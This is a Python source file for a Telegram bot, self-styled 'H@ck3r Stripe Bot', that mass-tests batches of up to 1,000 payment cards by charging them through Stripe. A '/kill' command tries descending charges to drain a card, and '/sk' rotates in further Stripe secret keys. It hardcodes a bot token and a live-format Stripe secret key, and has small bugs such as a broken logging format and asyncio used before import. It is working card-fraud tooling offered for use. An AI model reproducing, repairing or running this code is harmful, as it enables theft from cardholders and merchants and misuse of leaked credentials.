import logging
import re
from datetime import datetime
from telegram import Update
from telegram.ext import CommandHandler, CallbackContext, ApplicationBuilder
import stripe

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname=s - %(message)s', level=logging.INFO
)

logger = logging.getLogger(__name__)

# Your new Telegram bot token
TELEGRAM_BOT_TOKEN = '7629123058:AAFXz--V09IjwXsq4SRjk_xPYzvmKSWM34w'

# List of Stripe API keys
STRIPE_API_KEYS = ['sk_live_q2jh8qGjAx86X1gRdYtT6YEX']  # Default key

# Active Stripe API key
ACTIVE_STRIPE_API_KEY = STRIPE_API_KEYS[0]

# Function to validate Stripe API key
async def validate_sk_key(sk_key):
    try:
        stripe.api_key = sk_key
        stripe.Account.retrieve()
        return True
    except stripe.error.AuthenticationError:
        return False
    except stripe.error.StripeError as e:
        logger.error(f"Stripe error: {e.user_message}")
        return False

# Periodic task to check SK key stability
async def check_sk_keys_periodically():
    while True:
        for key in STRIPE_API_KEYS:
            if await validate_sk_key(key):
                global ACTIVE_STRIPE_API_KEY
                ACTIVE_STRIPE_API_KEY = key
                logger.info(f"Active SK key: {key}")
                break
        await asyncio.sleep(600)  # Check every 10 minutes

# Stripe charge function
async def charge_card_stripe(card_number, exp_month, exp_year, cvv, amount):
    try:
        stripe.api_key = ACTIVE_STRIPE_API_KEY
        token = stripe.Token.create(
            card={
                "number": card_number,
                "exp_month": exp_month,
                "exp_year": exp_year,
                "cvc": cvv,
            },
        )
        charge = stripe.Charge.create(
            amount=int(amount * 100),  # amount in cents
            currency="usd",
            source=token.id,
            description="Test Charge",
        )
        return charge.status == "succeeded"
    except stripe.error.CardError as e:
        if "declined" in str(e).lower():
            return "Declined"
        logger.error(f"Card error: {e.user_message}")
        return False
    except stripe.error.StripeError as e:
        if "api key" in str(e).lower():
            return "Invalid SK"
        logger.error(f"Stripe error: {e.user_message}")
        return False

# Luhn algorithm for card number validation
def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    
    return checksum % 10

def is_valid_card_number(card_number):
    return luhn_checksum(card_number) == 0

def is_valid_expiry_date(exp_month, exp_year):
    try:
        exp_date = datetime(int(exp_year), int(exp_month), 1)
        return exp_date > datetime.now()
    except ValueError:
        return False

def is_valid_cvv(cvv):
    return bool(re.fullmatch(r'\d{3,4}', cvv))

def validate_card(card_number, exp_month, exp_year, cvv):
    if not is_valid_card_number(card_number):
        return "❌ *Invalid card number.*"
    if not is_valid_expiry_date(exp_month, exp_year):
        return "❌ *Invalid expiry date.*"
    if not is_valid_cvv(cvv):
        return "❌ *Invalid CVV.*"
    return "✅ *The card details are valid.*"

# Start command handler
async def start(update: Update, context: CallbackContext):
    await update.message.reply_text('👾 *Welcome to the H@ck3r Stripe Bot!* 👾\n'
                                    '🔥 *Commands Available:* 🔥\n'
                                    '```\n'
                                    '/start - Display this help message\n'
                                    '/kill - Initiate Card Killer Mode\n'
                                    '/chk - Mass Check cards with $0.10 charge\n'
                                    '/chk1 - Mass Check cards with $1 charge\n'
                                    '/chk10 - Mass Check cards with $10 charge\n'
                                    '/sk <sk_key> - Add and validate a new Stripe API key\n'
                                    '/status - Verify card status\n'
                                    '/health - System health check\n'
                                    '/valid - Validate card details without charging\n'
                                    'Format: cardnumber|mm|yy|cvv\n'
                                    '```')
# SK key command handler
async def add_sk(update: Update, context: CallbackContext):
    try:
        new_sk_key = context.args[0]
    except IndexError:
        await update.message.reply_text('⚠️ *Error:*\nPlease provide the SK key in the format: `/sk sk_live_key`', parse_mode='Markdown')
        return
    
    if await validate_sk_key(new_sk_key):
        if new_sk_key not in STRIPE_API_KEYS:
            if len(STRIPE_API_KEYS) >= 20:
                STRIPE_API_KEYS.pop(0)  # Remove the oldest key if list exceeds 20 keys
            STRIPE_API_KEYS.append(new_sk_key)
        global ACTIVE_STRIPE_API_KEY
        ACTIVE_STRIPE_API_KEY = new_sk_key
        await update.message.reply_text(f'🔑 *Success:* The new SK key is valid and set as the active key.', parse_mode='Markdown')
    else:
        await update.message.reply_text('🔑 *Error:* Invalid SK key provided. Please enter a valid key.', parse_mode='Markdown')

# Generic checker function
async def checker(update: Update, context: CallbackContext, amount):
    message = await update.message.reply_text('💻 *Initiating Mass Check...* 💻', parse_mode='Markdown')
    card_entries = update.message.text.split()[1:]
    
    results = []
    for card_entry in card_entries[:1000]:  # Limit to 1000 cards
        card_info = card_entry.split('|')
        if len(card_info) < 4:
            results.append(f'🚫 *Invalid Format:* {card_entry}')
            continue
        
        card_number = card_info[0]
        exp_month = card_info[1]
        exp_year = card_info[2]
        cvv = card_info[3]
        validation_result = validate_card(card_number, exp_month, exp_year, cvv)
        if validation_result == "✅ *The card details are valid.*":
            charge_status = await charge_card_stripe(card_number, exp_month, exp_year, cvv, amount)
            if charge_status == "Invalid SK":
                await update.message.reply_text('🔑 *Error:* Invalid SK key provided. Please enter a valid key.', parse_mode='Markdown')
                return
            elif charge_status == "Declined":
                results.append(f'❌ *Declined:* {card_number} could not be charged ${amount}')
            elif charge_status:
                results.append(f'✔️ *Success:* {card_number} charged ${amount}')
            else:
                results.append(f'❌ *Failure:* {card_number} could not be charged ${amount}')
        else:
            results.append(f'🚫 *Invalid Card:* {card_number} - {validation_result}')

    await context.bot.edit_message_text(chat_id=update.message.chat_id,
                                        message_id=message.message_id,
                                        text='\n'.join(results),
                                        parse_mode='Markdown')
# Kill command handler with Stripe API
async def kill(update: Update, context: CallbackContext):
    try:
        card_info = context.args[0].split('|')
        card_number = card_info[0]
        exp_month = card_info[1]
        exp_year = card_info[2]
        cvv = card_info[3]
    except (IndexError, ValueError):
        await update.message.reply_text('⚠️ *Error:*\nPlease provide command in the format: `/kill cardnumber|mm|yy|cvv`', parse_mode='Markdown')
        return

    # Validate card details
    validation_result = validate_card(card_number, exp_month, exp_year, cvv)
    if validation_result != "✅ *The card details are valid.*":
        await update.message.reply_text(f'⚠️ *Error:*\n{validation_result}', parse_mode='Markdown')
        return

    message = await update.message.reply_text('💀 *Killer Mode: Engaged* 💀', parse_mode='Markdown')

    donation_amounts = [
        100.00,
        10.00,
        1.00,
        0.10,
        0.01,
        0.001,
        0.0001,
        0.00001,
        0.000001
    ]

    all_failed = True
    for amount in donation_amounts:
        success = False
        while True:
            charge_status = await charge_card_stripe(card_number, exp_month, exp_year, cvv, amount)
            if charge_status == "Invalid SK":
                await update.message.reply_text('🔑 *Error:* Invalid SK key provided. Please enter a valid key.', parse_mode='Markdown')
                return
            elif charge_status == "Declined":
                await update.message.reply_text(f'❌ *Declined:* {card_number} could not be charged ${amount}', parse_mode='Markdown')
                break
            elif charge_status:
                await context.bot.edit_message_text(chat_id=update.message.chat_id,
                                                    message_id=message.message_id,
                                                    text=f'✔️ *Donated:* ${amount}',
                                                    parse_mode='Markdown')
                success = True
                all_failed = False
                break
            else:
                await context.bot.edit_message_text(chat_id=update.message.chat_id,
                                                    message_id=message.message_id,
                                                    text=f'❌ *Failure:* {card_number} could not be charged ${amount}',
                                                    parse_mode='Markdown')
                break
        if success:
            break

    if all_failed:
        await context.bot.edit_message_text(chat_id=update.message.chat_id,
                                            message_id=message.message_id,
                                            text='💀 *Successfully Killed* 💀',
                                            parse_mode='Markdown')

# Validate card without charging
async def validate_card_no_charge(update: Update, context: CallbackContext):
    try:
        card_info = context.args[0].split('|')
        card_number = card_info[0]
        exp_month = card_info[1]
        exp_year = card_info[2]
        cvv = card_info[3]
    except (IndexError, ValueError):
        await update.message.reply_text('⚠️ *Error:*\nPlease provide command in the format: `/valid cardnumber|mm|yy|cvv`', parse_mode='Markdown')
        return

    # Validate card details
    validation_result = validate_card(card_number, exp_month, exp_year, cvv)
    await update.message.reply_text(validation_result, parse_mode='Markdown')

# Health command handler
async def health(update: Update, context: CallbackContext):
    await update.message.reply_text('💪 *System Health: All systems operational.*', parse_mode='Markdown')

# Status command handler
async def status(update: Update, context: CallbackContext):
    await update.message.reply_text(f'🔑 *Active Stripe Key:* {ACTIVE_STRIPE_API_KEY}', parse_mode='Markdown')

if __name__ == "__main__":
    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    start_handler = CommandHandler('start', start)
    add_sk_handler = CommandHandler('sk', add_sk)
    kill_handler = CommandHandler('kill', kill)
    chk_handler = CommandHandler('chk', lambda update, context: checker(update, context, 0.10))
    chk1_handler = CommandHandler('chk1', lambda update, context: checker(update, context, 1.00))
    chk10_handler = CommandHandler('chk10', lambda update, context: checker(update, context, 10.00))
    valid_handler = CommandHandler('valid', validate_card_no_charge)
    health_handler = CommandHandler('health', health)
    status_handler = CommandHandler('status', status)

    application.add_handler(start_handler)
    application.add_handler(add_sk_handler)
    application.add_handler(kill_handler)
    application.add_handler(chk_handler)
    application.add_handler(chk1_handler)
    application.add_handler(chk10_handler)
    application.add_handler(valid_handler)
    application.add_handler(health_handler)
    application.add_handler(status_handler)

    application.run_polling()

    import asyncio
    loop = asyncio.get_event_loop()
    loop.create_task(check_sk_keys_periodically())
    loop.run_forever()
